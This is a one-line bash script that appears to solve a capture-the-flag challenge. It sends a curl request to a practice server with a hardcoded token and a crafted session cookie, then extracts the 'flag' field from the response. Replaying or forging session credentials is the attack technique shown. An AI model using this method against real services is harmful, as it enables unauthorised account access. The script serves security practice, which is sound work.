#!/bin/bash

curl -s -H "X-Token: 492E64385D3779BC5F040E2B19D67742" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVNSEJ6YW5NMmVTSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJjZTBiNTJlZGRjM2EwY2RhNGE5NmVjNjQwYzA1ODk4YSJ9" http://server.vulnbegin.co.uk/user | jq '.flag' | tr '"' "\n"
